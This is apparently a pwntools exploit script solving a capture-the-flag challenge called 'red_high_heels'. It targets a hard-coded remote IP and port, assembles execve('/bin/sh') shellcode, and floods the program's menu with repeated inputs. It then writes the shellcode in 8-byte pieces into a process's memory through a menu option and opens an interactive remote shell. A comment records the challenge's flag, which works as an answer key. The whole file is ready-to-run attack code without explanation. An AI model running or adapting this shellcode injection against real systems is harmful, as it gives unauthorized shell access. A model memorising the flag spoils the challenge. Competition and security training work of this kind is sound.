#encoding:utf-8
from pwn import *
import re
from Crypto.Util.number import long_to_bytes,bytes_to_long

ip = '47.104.169.32'
port = 12233

def pwn():
	filename = './red_high_heels'
	context(os="linux", arch="amd64", timeout=3)
	shellcode = asm('''
	mov rbx, 0x68732f6e69622f 
    push rbx
    push rsp 
    pop rdi
    xor esi, esi
    xor edx, edx 
    push 0x3b
    pop rax
    syscall
    ''')
	pid = 0x300
	speed = 0x10
	poc = [('%d %d %lu' % (int(pid*0.9), i*8, u64(shellcode[i*8:i*8+8].ljust(0x8, b'\x00')))) for i in range(3)]
	poc_length = len(poc)

	#io = process(filename)
	io = remote(ip, port)
	for i in range(pid//speed):
		io.sendafter(b'>> ', b'3\nredflag\n'*speed) 
	
	io.sendafter(b'>> ', '3\n👠\n') 

	io.sendlineafter(b'>> ', b'4') 
	io.sendline(poc[0])
	io.sendlineafter(b'>> ', b'4') 
	io.sendline(poc[1])
	io.sendlineafter(b'>> ', b'4') 
	io.sendline(poc[2])

	sleep(1)
	io.recv(timeout=0.5)
	io.interactive()
	# WMCTF{C4rol_n0w_g0t_7im3_f0r_th3_pr0m}
	io.close()

if __name__ == '__main__':
	pwn()